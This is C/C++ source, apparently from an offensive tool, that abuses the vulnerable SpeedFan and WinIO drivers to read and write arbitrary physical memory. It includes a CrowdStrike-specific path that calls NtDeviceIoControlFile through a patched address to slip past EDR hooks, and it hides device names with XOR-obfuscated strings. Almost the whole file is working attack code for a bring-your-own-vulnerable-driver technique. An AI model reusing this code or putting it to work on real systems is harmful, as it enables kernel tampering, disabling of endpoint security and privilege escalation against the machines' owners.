#include "dm.h"

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID    Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef int(NTAPI* _C_NtDeviceIoControlFile)(
    _In_  HANDLE           FileHandle,
    _In_  HANDLE           Event,
    _In_  PVOID            ApcRoutine,
    _In_  PVOID            ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_  ULONG            IoControlCode,
    _In_  PVOID            InputBuffer,
    _In_  ULONG            InputBufferLength,
    _Out_ PVOID            OutputBuffer,
    _In_  ULONG            OutputBufferLength
    );

/*
* ================================================================================
* |                                SPEEDFAN BEGIN                                |
* ================================================================================
*/
static BOOL Speedfan_ReadPhysicalMemory(HANDLE hDevice, ULONGLONG PhysicalAddress, PVOID Buffer, ULONG Size, BOOL silent)
{
	BOOL success;
	DWORD nBytesReturned = 0;
	IOCTL_PHYMEM_READ_CMD params = { 0 };
	IO_STATUS_BLOCK IoStatusBlock;
	_C_NtDeviceIoControlFile NtDeviceIoControlFile;
	NTSTATUS status;

	params.sourceAddress = PhysicalAddress;
	switch (g_options->edrProfile)
	{
		case EdrCrowdstrike:
			NtDeviceIoControlFile = (_C_NtDeviceIoControlFile)g_options->patchAddress;
			memset(&IoStatusBlock, 0, sizeof(IO_STATUS_BLOCK));
			status = NtDeviceIoControlFile(
				hDevice,
				NULL,
				NULL,
				NULL,
				&IoStatusBlock,
				IOCTL_PHYMEM_READ,
				&params,
				sizeof(params),
				Buffer,
				Size
			);
			success = (status == 0x00);
			nBytesReturned = IoStatusBlock.Information;
			break;
		default:
			success = DeviceIoControl(
				hDevice,
				IOCTL_PHYMEM_READ,
				&params,
				sizeof(params),
				Buffer,
				Size,
				&nBytesReturned,
				NULL
			);
			break;
	}
	if (success) {
		if (!silent)
			printf("[+] Read %ld bytes from physical memory at address 0x%llx\n", nBytesReturned, PhysicalAddress);
	}
	else {
		if (!silent)
			printf("[!] Failed to read physical memory at 0x%llx (%ld)\n", PhysicalAddress, GetLastError());
		return (false);
	}
	return (true);
}

static BOOL Speedfan_WritePhysicalMemory(HANDLE hDevice, ULONGLONG PhysicalAddress, PVOID Buffer, ULONG Size, BOOL silent)
{
	BOOL success;
	DWORD nBytesReturned = 0;
	IO_STATUS_BLOCK IoStatusBlock;
	_C_NtDeviceIoControlFile NtDeviceIoControlFile;
	NTSTATUS status;
	unsigned char* writeCmd;

	writeCmd = (unsigned char*)malloc(sizeof(PhysicalAddress) + Size);
	memcpy(writeCmd, &PhysicalAddress, sizeof(PhysicalAddress));
	memcpy(writeCmd + sizeof(PhysicalAddress), Buffer, Size);

	switch (g_options->edrProfile)
	{
		case EdrCrowdstrike:
			NtDeviceIoControlFile = (_C_NtDeviceIoControlFile)g_options->patchAddress;
			memset(&IoStatusBlock, 0, sizeof(IO_STATUS_BLOCK));
			status = NtDeviceIoControlFile(
				hDevice,
				NULL,
				NULL,
				NULL,
				&IoStatusBlock,
				IOCTL_PHYMEM_WRITE,
				writeCmd,
				sizeof(PhysicalAddress) + Size,
				NULL,
				0
			);
			success = (status == 0x00);
			nBytesReturned = IoStatusBlock.Information;
			break;
		default:
			success = DeviceIoControl(
				hDevice,
				IOCTL_PHYMEM_WRITE,
				writeCmd,
				sizeof(PhysicalAddress) + Size,
				NULL,
				0x00,
				&nBytesReturned,
				NULL
			);
			break;
	}
	free(writeCmd);

	if (success) {
		if (!silent)
			printf("[+] Written %ld bytes to physical memory at address 0x%llx\n", Size, PhysicalAddress);
	}
	else {
		//if (!silent)
			printf("[!] Failed to write physical memory at 0x%llx (%ld)\n", PhysicalAddress, GetLastError());
		return (false);
	}
	return (true);
}

BOOL SPEEDFAN_read_phys(void* addr, void* buffer, std::size_t size)
{
	return Speedfan_ReadPhysicalMemory(
		g_drv_handle,
		(ULONGLONG)addr,
		buffer,
		size,
		true
	);
}

BOOL SPEEDFAN_write_phys(void* addr, void* buffer, std::size_t size)
{
	return Speedfan_WritePhysicalMemory(
		g_drv_handle,
		(ULONGLONG)addr,
		buffer,
		size,
		true
	);
}

HANDLE SPEEDFAN_load_drv()
{
	HANDLE result = CreateFileA(
		XorStr("\\\\.\\SpeedFan"),
		GENERIC_READ | GENERIC_WRITE,
		0x00,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	return (result);
}
/*
* ================================================================================
* |                                 SPEEDFAN END                                 |
* ================================================================================
*/


/*
* ================================================================================
* |                                 WINIO START                                  |
* ================================================================================
*/
static ULONGLONG WinIO_mapPhysicalMemory(HANDLE hDevice, IOCTL_WINIO_PHYMEM_READ_CMD *args)
{
	DWORD retSize;
	BOOL success;
	NTSTATUS status;
	IO_STATUS_BLOCK IoStatusBlock;
	_C_NtDeviceIoControlFile NtDeviceIoControlFile;

	if (INVALID_HANDLE_VALUE != hDevice)
	{
		switch (g_options->edrProfile)
		{
			case EdrCrowdstrike:
				NtDeviceIoControlFile = (_C_NtDeviceIoControlFile)g_options->patchAddress;
				memset(&IoStatusBlock, 0, sizeof(IO_STATUS_BLOCK));
				status = NtDeviceIoControlFile(
					hDevice,
					NULL,
					NULL,
					NULL,
					&IoStatusBlock,
					IOCTL_WINIO_PHYMEM_MAP,
					args,
					sizeof(IOCTL_WINIO_PHYMEM_READ_CMD),
					args,
					sizeof(IOCTL_WINIO_PHYMEM_READ_CMD)
				);
				//printf("[-] Result: 0x%x, written %ld bytes\n", status, IoStatusBlock.Information);
				success = (status == 0x00);
				retSize = IoStatusBlock.Information;
				break;
			default:
				success = DeviceIoControl(
					hDevice,
					IOCTL_WINIO_PHYMEM_MAP,
					args,
					sizeof(IOCTL_WINIO_PHYMEM_READ_CMD),
					args,
					sizeof(IOCTL_WINIO_PHYMEM_READ_CMD),
					&retSize,
					NULL
				);
				break;
		}
		if (success) {
			//printf("[+] Memory mapped, written %d bytes\n", retSize);
			return (args->outPtr);
		}
		else {
			printf("[!] Failed to map physical address: %d\n", GetLastError());
		}
		getchar();
		exit(0);
	}
	return (0x00);
}

static void WinIO_unmapPhysicalMemory(HANDLE hDevice, IOCTL_WINIO_PHYMEM_READ_CMD *args)
{
	DWORD retSize;
	BOOL success;

	if (INVALID_HANDLE_VALUE != hDevice)
	{
		success = DeviceIoControl(
			hDevice,
			IOCTL_WINIO_PHYMEM_UNMAP,
			args,
			sizeof(IOCTL_WINIO_PHYMEM_READ_CMD),
			NULL,
			0,
			&retSize, NULL
		);
		if (success) {
			//printf("[+] Unmapped address\n");
		}
		else {
			printf("[!] Failed to unmap address: %d\n", GetLastError());
		}
	}
}

BOOL WINIO_read_phys(void* addr, void* buffer, std::size_t size)
{
	ULONGLONG mappedAddress;
	IOCTL_WINIO_PHYMEM_READ_CMD args = { .size = 0, .addr = 0x00, .unk1 = 0, .outPtr = 0, .unk2 = 0 };

	args.addr = (ULONGLONG)addr;
	args.size = size;
	mappedAddress = WinIO_mapPhysicalMemory(g_drv_handle, &args);
	if (mappedAddress != 0x00)
	{
		memcpy(buffer, (void*)mappedAddress, size);
		WinIO_unmapPhysicalMemory(g_drv_handle, &args);
		//printf("[+] Read %ld bytes from physical memory at address 0x%llx\n", size, addr);
	}
	else {
		printf("[!] Failed to read physical memory at 0x%llx (%ld)\n", addr, GetLastError());
		return (false);
	}
	return (true);
}

BOOL WINIO_write_phys(void* addr, void* buffer, std::size_t size)
{
	ULONGLONG mappedAddress;
	IOCTL_WINIO_PHYMEM_READ_CMD args = { .size = 0, .addr = 0x00, .unk1 = 0, .outPtr = 0, .unk2 = 0 };

	args.addr = (ULONGLONG)addr;
	args.size = size;
	mappedAddress = WinIO_mapPhysicalMemory(g_drv_handle, &args);
	if (mappedAddress != 0x00)
	{
		memcpy((void *)mappedAddress, buffer, size);
		WinIO_unmapPhysicalMemory(g_drv_handle, &args);
		//printf("[+] Written %ld bytes to physical memory at address 0x%llx\n", size, addr);
	}
	else {
		printf("[!] Failed to write physical memory at 0x%llx (%ld)\n", addr, GetLastError());
		return (false);
	}
	return (true);
}

HANDLE WINIO_load_drv()
{
	HANDLE result = CreateFileA(
		XorStr("\\\\.\\WINIO"),
		GENERIC_READ | GENERIC_WRITE,
		0x00,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	return (result);
}
/*
* ================================================================================
* |                                 WINIO END                                    |
* ================================================================================
*/

